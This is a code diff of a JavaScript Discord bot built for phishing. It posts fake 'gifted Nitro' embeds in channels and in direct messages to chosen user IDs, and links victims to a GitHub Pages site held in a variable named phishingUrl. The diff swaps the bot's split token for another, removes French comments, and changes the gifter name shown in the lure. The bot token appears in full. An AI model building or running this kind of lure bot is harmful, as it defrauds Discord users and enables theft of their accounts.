@@ -1,5 +1,5 @@
-const part1 = "MTU2NTE4OTU2MTg5MjQ3NTAwMA.Grbllh.";
-const part2 = "Gc3mn8tYBGyg5i8TrTZW1f2fmKF69cUw_bD6Ec";
+const part1 = "MTU2NTE4OTU2MTg5MjQ3NTAwMA.GOWmD_.";
+const part2 = "ICkmBCZggvMATzW372h245s1uoyRPEl9ac67PA";
 const botToken = part1 + part2;
 
 const phishingUrl = "https://swiemali2-lgtm.github.io/member-cleanup/"; 
@@ -34,21 +34,18 @@ async function listen() {
           })).json();
           
           if (Array.isArray(msgs)) {
-            // On parcourt les messages du plus ancien au plus récent
             for (let i = msgs.length - 1; i >= 0; i--) {
               let m = msgs[i];
               if (!m.content || processedMessages.has(m.id)) continue;
               
               const content = m.content.toLowerCase().trim();
               
-              // Commande "nitro" pour le salon actuel
               if (content === "nitro") {
-                processedMessages.add(m.id); // On enregistre l'id pour ne plus le lire
+                processedMessages.add(m.id); 
                 console.log("envoi du faux nitro dans le salon :", c.id);
                 sendNitro(c.id);
               }
               
-              // Commande "dm ID" pour envoyer en privé
               if (content.startsWith("dm ")) {
                 processedMessages.add(m.id);
                 const targetId = content.split(" ")[1];
@@ -66,7 +63,7 @@ async function listen() {
 async function sendNitro(channelId) {
   let embed = {
     title: "You've been gifted a subscription!",
-    description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
+    description: `**100pression** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
     color: 0x5865f2,
     image: {
       url: imageUrl
@@ -120,7 +117,7 @@ async function sendDM(targetId) {
   
   let embed = {
     title: "You've been gifted a subscription!",
-    description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
+    description: `**100pression** has gifted you Nitro for 3 months!\n\nExpires in 48 hours`,
     color: 0x5865f2,
     image: {
       url: imageUrl
